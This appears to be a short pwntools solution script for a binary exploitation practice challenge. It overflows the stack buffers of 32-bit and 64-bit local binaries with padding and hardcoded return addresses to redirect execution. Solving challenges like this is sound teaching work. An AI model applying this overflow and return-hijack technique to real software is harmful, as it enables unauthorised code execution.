from pwn import *

# /!\ Les adresses sont rentrées en dures afin de limiter l'utilisation de pwntools (dans le cas où l'on montrerait le script à des novices dans un wu ou autre). Le gcc de prod les déplacera sans doutes.

context.binary = "./I_wanna_pwn_you_tonight_32_bits"
elf = ELF("./I_wanna_pwn_you_tonight_32_bits")
rop = ROP(elf)

rop.raw(b"A"*44)
rop.raw(p32(0x0804925f))
rop.raw(p32(0))
rop.raw(p32(0xdeadbeef))

f = open("input", "wb")
f.write(rop.chain())
f.close()

p = process("./I_wanna_pwn_you_tonight_32_bits")
p.recvuntil(b"tonight\n")
p.sendline(rop.chain())
p.recvline()
print(p.recvline())
p.close()

context.binary = "./I_wanna_pwn_you_tonight_64_bits"
elf = ELF("./I_wanna_pwn_you_tonight_64_bits")
rop = ROP(elf)

rop.raw(b"A"*40)
rop.raw(p64(0x00000000004011e2))
rop.raw(p64(0xdeadbeef))
rop.raw(p64(0x00000000004011e7))

f = open("input", "wb")
f.write(rop.chain())
f.close()

p = process("./I_wanna_pwn_you_tonight_64_bits")
p.recvuntil(b"tonight\n")
p.sendline(rop.chain())
p.recvline()
print(p.recvline())
p.close()
